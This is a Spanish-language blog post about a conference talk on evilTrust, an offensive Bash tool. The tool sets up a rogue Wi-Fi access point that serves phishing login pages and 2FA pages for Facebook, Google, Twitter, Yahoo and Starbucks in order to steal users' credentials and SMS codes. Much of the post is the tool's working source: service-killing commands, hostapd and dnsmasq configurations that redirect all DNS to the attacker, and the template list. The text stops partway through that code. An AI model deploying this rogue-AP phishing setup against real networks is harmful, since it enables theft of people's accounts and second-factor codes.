<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            h-c0n 2020 - evilTrust (Herramienta Ofensiva) - Aitor      Ciberseguridad y Hacking Ético      </title>
<meta name="description" content="Recientemente estuve en la h-c0n presentando la herramienta evilTrust. En este artículo, comento la utilidad de la herramienta para todos aquellos que la quieran probar. Gracias a los organizadores del evento por invitarme y a todos los presentes por la gran acogida.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Aitor | Ciberseguridad y Hacking Ético">
<meta property="og:title" content="h-c0n 2020 - evilTrust (Herramienta Ofensiva)">
<meta property="og:url" content="http://localhost:4000/evil-trust/">


  <meta property="og:description" content="Recientemente estuve en la h-c0n presentando la herramienta evilTrust. En este artículo, comento la utilidad de la herramienta para todos aquellos que la quieran probar. Gracias a los organizadores del evento por invitarme y a todos los presentes por la gran acogida.">



  <meta property="og:image" content="http://localhost:4000/assets/images/evil-trust/evil.png">





  <meta property="article:published_time" content="2020-02-02T00:00:00+01:00">





  

  


<link rel="canonical" href="http://localhost:4000/evil-trust/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Aitorgg02",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Aitor | Ciberseguridad y Hacking Ético Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Artículos</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categorías</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Etiquetas</a>
            </li>
<li class="masthead__menu-item">
              <a href="/buscador/">Buscador</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">h-c0n 2020 - evilTrust (Herramienta Ofensiva)</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="Aitorgg02" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Aitorgg02</h3>
    
    
      <p class="author__bio" itemprop="description">
        CyberSecurity and Web Developer
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/aitor-gonz%C3%A1lez-gonz%C3%A1lez-44b836189" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/aitorgg02" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="h-c0n 2020 - evilTrust (Herramienta Ofensiva)">
    <meta itemprop="description" content="Recientemente estuve en la h-c0n presentando la herramienta evilTrust. En este artículo, comento la utilidad de la herramienta para todos aquellos que la quieran probar. Gracias a los organizadores del evento por invitarme y a todos los presentes por la gran acogida.">
    <meta itemprop="datePublished" content="February 02, 2020">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">h-c0n 2020 - evilTrust (Herramienta Ofensiva)
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-02-02T00:00:00+01:00">February 02, 2020 </time> 
          
          
        </p>
        <p align="center">
<img src="/assets/images/evil-trust/evil.png" width="200">
</p>

<p>Recientemente estuve en la <strong>h-c0n</strong> presentando la herramienta <a href="https://github.com/s4vitar/evilTrust">evilTrust</a>. Antes que nada quiero agradecer a los organizadores del evento por invitarme y a todos los presentes por la gran acogida, lo pasamos entre todos bastante bien.</p>

<div class="row">
  <div class="columns">
    <img src="/assets/images/evil-trust/Photo5.png" alt="Snow" style="width:30%">
    <img src="/assets/images/evil-trust/Photo4.png" alt="Forest" style="width:37%">
    <img src="/assets/images/evil-trust/Photo2.png" alt="Mountains" style="width:30%">
    <img src="/assets/images/evil-trust/Photo3.png" alt="Mountains" style="width:30%">
    <img src="/assets/images/evil-trust/Photo1.png" alt="Mountains" style="width:34%">
    <img src="/assets/images/evil-trust/Photo6.png" alt="Mountains" style="width:34%">
  </div>
</div>
<p><br>
Para los interesados, deciros que tenéis la charla disponible en el siguiente enlace:</p>

<ul>
  <li><a href="https://www.youtube.com/watch?v=-GIA9et7ZRg">h-c0n 2020 | evilTrust - Herramienta Ofensiva</a></li>
</ul>

<p>También os la dejo por aquí para aquellos que la quieran ver directamente:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/-GIA9et7ZRg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<h2 id="qué-es-eviltrust">¿Qué es EvilTrust?</h2>

<p><strong>EvilTrust</strong> es una herramienta ofensiva, ideal para robar los datos de acceso de un usuario. A altos rasgos, la herramienta se encarga de manera automatizada de desplegar un <strong>Rogue AP</strong>, quedando a la espera de clientes potenciales que se asocien a este para proseguir con el ataque.</p>

<p>Cabe decir que el objetivo principal no es el de un ataque <strong>Evil Twin</strong>, puesto que la finalidad no es obtener la contraseña de una red inalámbrica, sino los datos privados del cliente que se asocie al punto de acceso.</p>

<p>La herramienta dispone de varias plantillas a utilizar, incluyendo una plantilla personalizada, donde el atacante es capaz de desplegar su propia plantilla.</p>

<h2 id="qué-capacidades-trae-eviltrust">¿Qué capacidades trae evilTrust?</h2>

<p>Cada una de las plantillas configuradas (Facebook, Twitter, Google, Starbucks, Yahoo, …) vienen acompañadas de una plantilla de 2FA (Segundo Factor de Autenticación), la cual nos permitirá obtener el código de acceso que se envía por SMS a todo usuario que disponga de esta medida de protección activada.</p>

<h2 id="cómo-está-estructurada-la-herramienta">¿Cómo está estructurada la herramienta?</h2>

<p>La herramienta está desarrollada en <strong>Bash</strong>, y es capaz de operar en 2 modos en base al parámetro <code class="language-plaintext highlighter-rouge">-m</code>:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌─</span><span class="p">[</span><span class="n">root</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">evilTrust</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">#</span><span class="o">./</span><span class="n">evilTrust</span><span class="o">.</span><span class="n">sh</span> 

<span class="err">╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮</span>
<span class="err">╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮</span>
<span class="err">╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯</span>
<span class="err">┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃</span>   <span class="p">(</span><span class="n">Hecho</span> <span class="n">por</span> <span class="n">s4vitar</span><span class="p">)</span>
<span class="err">┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮</span>
<span class="err">╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯</span>

<span class="n">Uso</span><span class="o">:</span>
        <span class="p">[</span><span class="o">-</span><span class="n">m</span><span class="p">]</span> <span class="n">Modo</span> <span class="n">de</span> <span class="n">ejecución</span> <span class="p">(</span><span class="n">terminal</span><span class="o">|</span><span class="n">gui</span><span class="p">)</span> <span class="p">[</span><span class="o">-</span><span class="n">m</span> <span class="n">terminal</span> <span class="o">|</span> <span class="o">-</span><span class="n">m</span> <span class="n">gui</span><span class="p">]</span>
        <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="n">Mostrar</span> <span class="n">este</span> <span class="n">panel</span> <span class="n">de</span> <span class="n">ayuda</span>
</code></pre></div></div>

<ul>
  <li>
<strong>Modo terminal</strong>: Para los amantes de consola que prefieren no hacer uso de interfaz gráfica</li>
  <li>
<strong>Modo GUI</strong>: Para los amantes de interfaz gráfica que odian manejarse por consola</li>
</ul>

<p>Esta parte se gestiona básicamente desde esta porción de código:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="n">Main</span> <span class="n">Program</span>

<span class="k">if</span> <span class="p">[</span> <span class="s">"$(id -u)"</span> <span class="o">==</span> <span class="s">"0"</span> <span class="p">];</span> <span class="n">then</span>
	<span class="n">declare</span> <span class="o">-</span><span class="n">i</span> <span class="n">parameter_enable</span><span class="o">=</span><span class="m">0</span><span class="p">;</span> <span class="n">while</span> <span class="n">getopts</span> <span class="s">":m:h:"</span> <span class="n">arg</span><span class="p">;</span> <span class="n">do</span>
		<span class="k">case</span> <span class="err">$</span><span class="n">arg</span> <span class="n">in</span>
			<span class="n">m</span><span class="p">)</span> <span class="n">mode</span><span class="o">=</span><span class="err">$</span><span class="n">OPTARG</span> <span class="o">&amp;&amp;</span> <span class="n">let</span> <span class="n">parameter_enable</span><span class="o">+=</span><span class="m">1</span><span class="p">;;</span>
			<span class="n">h</span><span class="p">)</span> <span class="n">helpPanel</span><span class="p">;;</span>
		<span class="n">esac</span>
	<span class="n">done</span>

	<span class="k">if</span> <span class="p">[</span> <span class="err">$</span><span class="n">parameter_enable</span> <span class="o">-</span><span class="n">ne</span> <span class="m">1</span> <span class="p">];</span> <span class="n">then</span>
		<span class="n">helpPanel</span>
	<span class="k">else</span>
		<span class="k">if</span> <span class="p">[</span> <span class="s">"$mode"</span> <span class="o">==</span> <span class="s">"terminal"</span> <span class="p">];</span> <span class="n">then</span>
			<span class="n">tput</span> <span class="n">civis</span><span class="p">;</span> <span class="n">banner</span>
			<span class="n">dependencies</span>
			<span class="n">startAttack</span>
		<span class="n">elif</span> <span class="p">[</span> <span class="s">"$mode"</span> <span class="o">==</span> <span class="s">"gui"</span> <span class="p">];</span> <span class="n">then</span>
			<span class="n">guiMode</span>
		<span class="k">else</span>
			<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"Modo no conocido"</span>
			<span class="n">exit</span> <span class="m">1</span>
		<span class="n">fi</span>
	<span class="n">fi</span>
<span class="k">else</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"</span>
	<span class="n">exit</span> <span class="m">1</span>
<span class="n">fi</span>
</code></pre></div></div>

<p>Tras su ejecución, a través de la función <code class="language-plaintext highlighter-rouge">dependencies</code>, se hace una comprobación de las herramientas necesarias para que evilTrust funcione:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">function</span> <span class="n">dependencies</span><span class="p">(){</span>
	<span class="n">sleep</span> <span class="m">1.5</span><span class="p">;</span> <span class="n">counter</span><span class="o">=</span><span class="m">0</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...</span><span class="se">\n</span><span class="s">"</span>
	<span class="n">sleep</span> <span class="m">1</span>

	<span class="n">dependencias</span><span class="o">=</span><span class="p">(</span><span class="n">php</span> <span class="n">dnsmasq</span> <span class="n">hostapd</span><span class="p">)</span>

	<span class="k">for</span> <span class="n">programa</span> <span class="n">in</span> <span class="s">"${dependencias[@]}"</span><span class="p">;</span> <span class="n">do</span>
		<span class="k">if</span> <span class="p">[</span> <span class="s">"$(command -v $programa)"</span> <span class="p">];</span> <span class="n">then</span>
			<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} se encuentra instalada"</span>
			<span class="n">let</span> <span class="n">counter</span><span class="o">+=</span><span class="m">1</span>
		<span class="k">else</span>
			<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} no se encuentra instalada"</span>
		<span class="n">fi</span><span class="p">;</span> <span class="n">sleep</span> <span class="m">0.4</span>
	<span class="n">done</span>

	<span class="k">if</span> <span class="p">[</span> <span class="s">"$(echo $counter)"</span> <span class="o">==</span> <span class="s">"3"</span> <span class="p">];</span> <span class="n">then</span>
		<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${grayColour} Comenzando...</span><span class="se">\n</span><span class="s">"</span>
		<span class="n">sleep</span> <span class="m">3</span>
	<span class="k">else</span>
		<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}</span><span class="se">\n</span><span class="s">"</span>
		<span class="n">tput</span> <span class="n">cnorm</span><span class="p">;</span> <span class="n">exit</span>
	<span class="n">fi</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Tal y como se puede apreciar, para el correcto funcionamiento de la herramienta, es necesario contar con <code class="language-plaintext highlighter-rouge">php</code>, <code class="language-plaintext highlighter-rouge">dnsmasq</code> y <code class="language-plaintext highlighter-rouge">hostpad</code> instalado. En caso de no contar con estas utilidades, evilTrust se encargará de instalar todo lo necesario para poder operar.</p>

<p>Una vez la comprobación es realizada, se llama a la función <code class="language-plaintext highlighter-rouge">startAttack</code>, donde tal y como su nombre indica… se comienza a desplegar el ataque.</p>

<p>Es en esta fase donde se configurarán una serie de archivos temporales necesarios para desplegar el AP, haciendo que la tarjeta de red opere en modo Router (es obligatorio que la tarjeta de red en uso acepte el <strong>modo monitor</strong>):</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">function</span> <span class="n">startAttack</span><span class="p">(){</span>
	<span class="n">clear</span><span class="p">;</span> <span class="k">if</span> <span class="p">[[</span> <span class="o">-</span><span class="n">e</span> <span class="n">credenciales</span><span class="o">.</span><span class="n">txt</span> <span class="p">]];</span> <span class="n">then</span>
		<span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="n">credenciales</span><span class="o">.</span><span class="n">txt</span>
	<span class="n">fi</span>

	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"</span><span class="p">;</span> <span class="n">sleep</span> <span class="m">1</span>

	<span class="err">#</span> <span class="n">Si</span> <span class="n">la</span> <span class="n">interfaz</span> <span class="n">posee</span> <span class="n">otro</span> <span class="n">nombre</span><span class="p">,</span> <span class="n">cambiarlo</span> <span class="n">en</span> <span class="n">este</span> <span class="n">punto</span> <span class="p">(</span><span class="n">consideramos</span> <span class="n">que</span> <span class="n">se</span> <span class="n">llama</span> <span class="n">wlan0</span> <span class="n">por</span> <span class="n">defecto</span><span class="p">)</span>
	<span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span><span class="p">;</span> <span class="k">interface</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">ifconfig</span> <span class="o">-</span><span class="n">a</span> <span class="o">|</span> <span class="n">cut</span> <span class="o">-</span><span class="n">d</span> <span class="sc">' '</span> <span class="o">-</span><span class="n">f</span> <span class="m">1</span> <span class="o">|</span> <span class="n">xargs</span> <span class="o">|</span> <span class="n">tr</span> <span class="sc">' '</span> <span class="sc">'\n'</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> <span class="sc">':'</span> <span class="o">&gt;</span> <span class="n">iface</span><span class="p">)</span>
	<span class="n">counter</span><span class="o">=</span><span class="m">1</span><span class="p">;</span> <span class="k">for</span> <span class="k">interface</span> <span class="n">in</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="n">iface</span><span class="p">);</span> <span class="n">do</span>
		<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\t\n</span><span class="s">${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"</span><span class="p">;</span> <span class="n">sleep</span> <span class="m">0.26</span>
		<span class="n">let</span> <span class="n">counter</span><span class="o">++</span>
	<span class="n">done</span><span class="p">;</span> <span class="n">tput</span> <span class="n">cnorm</span>
	<span class="n">checker</span><span class="o">=</span><span class="m">0</span><span class="p">;</span> <span class="n">while</span> <span class="p">[</span> <span class="err">$</span><span class="n">checker</span> <span class="o">-</span><span class="n">ne</span> <span class="m">1</span> <span class="p">];</span> <span class="n">do</span>
		<span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}"</span> <span class="o">&amp;&amp;</span> <span class="n">read</span> <span class="n">choosed_interface</span>

		<span class="k">for</span> <span class="k">interface</span> <span class="n">in</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="n">iface</span><span class="p">);</span> <span class="n">do</span>
			<span class="k">if</span> <span class="p">[</span> <span class="s">"$choosed_interface"</span> <span class="o">==</span> <span class="s">"$interface"</span> <span class="p">];</span> <span class="n">then</span>
				<span class="n">checker</span><span class="o">=</span><span class="m">1</span>
			<span class="n">fi</span>
		<span class="n">done</span><span class="p">;</span> <span class="k">if</span> <span class="p">[</span> <span class="err">$</span><span class="n">checker</span> <span class="o">-</span><span class="n">eq</span> <span class="m">0</span> <span class="p">];</span> <span class="n">then</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"</span><span class="p">;</span> <span class="n">fi</span>
	<span class="n">done</span>

	<span class="n">rm</span> <span class="n">iface</span> <span class="m">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} "</span> <span class="o">&amp;&amp;</span> <span class="n">read</span> <span class="o">-</span><span class="n">r</span> <span class="n">use_ssid</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} "</span> <span class="o">&amp;&amp;</span> <span class="n">read</span> <span class="n">use_channel</span><span class="p">;</span> <span class="n">tput</span> <span class="n">civis</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${redColour}[!] Matando todas las conexiones...${endColour}</span><span class="se">\n</span><span class="s">"</span>
	<span class="n">sleep</span> <span class="m">2</span>
	<span class="n">killall</span> <span class="n">network</span><span class="o">-</span><span class="n">manager</span> <span class="n">hostapd</span> <span class="n">dnsmasq</span> <span class="n">wpa_supplicant</span> <span class="n">dhcpd</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span>
	<span class="n">sleep</span> <span class="m">5</span>

	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"interface=$choosed_interface</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;</span> <span class="n">hostapd</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"driver=nl80211</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">hostapd</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"ssid=$use_ssid</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">hostapd</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"hw_mode=g</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">hostapd</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"channel=$use_channel</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">hostapd</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"macaddr_acl=0</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">hostapd</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"auth_algs=1</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">hostapd</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"ignore_broadcast_ssid=0</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">hostapd</span><span class="o">.</span><span class="n">conf</span>

	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}</span><span class="se">\n</span><span class="s">"</span>
	<span class="n">sleep</span> <span class="m">2</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"</span>
	<span class="n">hostapd</span> <span class="n">hostapd</span><span class="o">.</span><span class="n">conf</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span> <span class="o">&amp;</span>
	<span class="n">sleep</span> <span class="m">6</span>

	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"</span><span class="se">\n</span><span class="s">${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"interface=$choosed_interface</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;</span> <span class="n">dnsmasq</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">dnsmasq</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"dhcp-option=3,192.168.1.1</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">dnsmasq</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"dhcp-option=6,192.168.1.1</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">dnsmasq</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"server=8.8.8.8</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">dnsmasq</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"log-queries</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">dnsmasq</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"log-dhcp</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">dnsmasq</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"listen-address=127.0.0.1</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">dnsmasq</span><span class="o">.</span><span class="n">conf</span>
	<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s">"address=/#/192.168.1.1</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="n">dnsmasq</span><span class="o">.</span><span class="n">conf</span>

	<span class="n">ifconfig</span> <span class="err">$</span><span class="n">choosed_interface</span> <span class="n">up</span> <span class="m">192.168.1.1</span> <span class="n">netmask</span> <span class="m">255.255.255.0</span>
	<span class="n">sleep</span> <span class="m">1</span>
	<span class="n">route</span> <span class="n">add</span> <span class="o">-</span><span class="n">net</span> <span class="m">192.168.1.0</span> <span class="n">netmask</span> <span class="m">255.255.255.0</span> <span class="n">gw</span> <span class="m">192.168.1.1</span>
	<span class="n">sleep</span> <span class="m">1</span>
	<span class="n">dnsmasq</span> <span class="o">-</span><span class="n">C</span> <span class="n">dnsmasq</span><span class="o">.</span><span class="n">conf</span> <span class="o">-</span><span class="n">d</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span> <span class="o">&amp;</span>
    <span class="n">sleep</span> <span class="m">5</span>
    <span class="o">...</span>    
</code></pre></div></div>

<p><strong>Consideración</strong>: A nivel de código, la tarjeta de red que ha sido configurada por defecto tiene nombre <code class="language-plaintext highlighter-rouge">wlan0</code>. Es importante tener en cuenta que esto no siempre es así, las tarjetas de red pueden referenciarse por nombres distintos y no siempre se llaman igual. En caso de ser distinto, es necesario cambiar su nombre desde el propio código.</p>

<p>En esta fase se nos solicitan varias cosas:</p>

<ul>
  <li>Nombre del punto de acceso.</li>
  <li>Canal en el que queremos que el punto de acceso opere.</li>
  <li>Interfaz de red a utilizar (por defecto <strong>wlan0</strong>)</li>
</ul>

<p>Una vez rellenados estos puntos, se desplegará un AP con las configuraciones especificadas, asignado la dirección IP ‘<strong>192.168.1.1</strong>’ a nuestra interfaz de red en modo monitor.</p>

<p>Ya con estas especificaciones seteadas, se procede a la selección de plantilla:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="err">#</span> <span class="n">Array</span> <span class="n">de</span> <span class="n">plantillas</span>
	<span class="n">plantillas</span><span class="o">=</span><span class="p">(</span><span class="n">facebook</span><span class="o">-</span><span class="n">login</span> <span class="n">google</span><span class="o">-</span><span class="n">login</span> <span class="n">starbucks</span><span class="o">-</span><span class="n">login</span> <span class="n">twitter</span><span class="o">-</span><span class="n">login</span> <span class="n">yahoo</span><span class="o">-</span><span class="n">login</span> <span class="n">cliqq</span><span class="o">-</span><span class="n">payload</span> <span class="n">optimumwifi</span> <span class="n">all_in_one</span><span class="p">)</span>

